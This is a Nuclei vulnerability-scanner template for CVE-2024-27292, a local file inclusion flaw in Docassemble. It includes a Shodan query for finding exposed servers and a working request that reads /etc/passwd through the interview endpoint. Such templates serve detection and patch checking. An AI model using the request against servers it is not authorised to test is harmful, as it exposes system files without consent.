id: CVE-2024-27292

info:
  name: Docassemble - Local File Inclusion
  author: johnk3r
  severity: high
  description: |
    Docassemble is an expert system for guided interviews and document assembly. The vulnerability allows attackers to gain unauthorized access to information on the system through URL manipulation. It affects versions 1.4.53 to 1.4.96. The vulnerability has been patched in version 1.4.97 of the master branch.
  impact: |
    Unauthenticated attackers can read arbitrary files on the server through URL manipulation in the Docassemble interview endpoint.
  remediation: |
    Update Docassemble to version 1.4.97 or later.
  reference:
    - https://tantosec.com/blog/docassemble/
    - https://github.com/jhpyle/docassemble/security/advisories/GHSA-jq57-3w7p-vwvv
    - https://github.com/jhpyle/docassemble/commit/97f77dc486a26a22ba804765bfd7058aabd600c9
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2024-27292
    cwe-id: CWE-706
    epss-score: 0.93859
    epss-percentile: 0.9986
  metadata:
    verified: true
    max-request: 1
    shodan-query: http.title:"docassemble"
    fofa-query: icon_hash="-575790689"
  tags: cve,cve2024,docassemble,lfi,vkev,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/interview?i=/etc/passwd"

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "root:.*:0:0:"

      - type: status
        status:
          - 501
# digest: 4b0a00483046022100a7372e43679cdaa6760064865756ab09cb6484c76d0cefe12768d515f2992a67022100d320d954811bbf7d7dd64c73b1bffdbc13a1e61ca7df4f2eb15192b60694c082:922c64590222798bb761d5b6d8e72950